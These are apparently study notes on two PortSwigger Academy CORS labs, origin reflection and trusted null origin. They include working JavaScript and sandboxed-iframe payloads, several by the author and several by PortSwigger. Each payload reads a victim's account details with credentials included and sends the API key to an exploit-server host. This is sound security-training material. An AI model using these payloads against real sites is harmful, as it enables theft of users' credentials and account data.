# CORS

- https://portswigger.net/web-security/cors
- https://portswigger.net/web-security/cors/same-origin-policy
- https://portswigger.net/web-security/cors/access-control-allow-origin

## CORS vulnerability with basic origin reflection

When `Origin` header is added, it is being reflected to `ACAO` header either way. Accessing the response is acceptable. Only thing is to specify including credentials (cookies).

Deliver to victim:

```
<script>
const tmp = async () => {
    var r = await fetch("https://0a5300a704e0f23c82a3470c004d003f.web-security-academy.net/accountDetails", {credentials: "include"}); 
    var j = await r.json(); 
    fetch("https://exploit-0a6b001f047ff2d5823d469b01b8001c.exploit-server.net/exploit?q=" + j.apikey)
}
tmp()
</script>
```

Above request add `Origin` header automatically, which is reflected into `ACAO` header.

From what I assume, if there is no `Access-Control-Allow-Origin` in the response, results of it could not be access from the js. So here making request with `mode: "no-cors"`, makes it not append `Origin` header, which prevent it from being reflected into `ACAO`, which stops js execution

Solution via portwigger:

```
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

## CORS vulnerability with trusted null origin

Playing around with `GET /accountDetails` request:
 - Not specifing the `Origin` header, respond without `ACAO` header
 - Specifing `https://0ab900a703040b268435609a00610045.web-security-academy.net` as `Origin` reflects it in `ACAO`
 - Specifing `Test` as `Origin` respond without `ACAO` header
 - Specifing `null` as `Origin` reflects it in `ACAO`

So triggering the request with `Origin: null` will allow us to access the data.

Including our script in this `iframe` will cause the origin to be `null`. Deliver this to the victim:

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
const tmp = async () => {
    var r = await fetch('https://0ab900a703040b268435609a00610045.web-security-academy.net/accountDetails', {credentials: 'include'})
    var j = await r.json()
    fetch('https://exploit-0a650065038d0bee84425f1301cb00c5.exploit-server.net/exploit?q=' + j.apikey)
}
tmp()
</script>"></iframe>
```

Alternative Portswigger solution:

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```
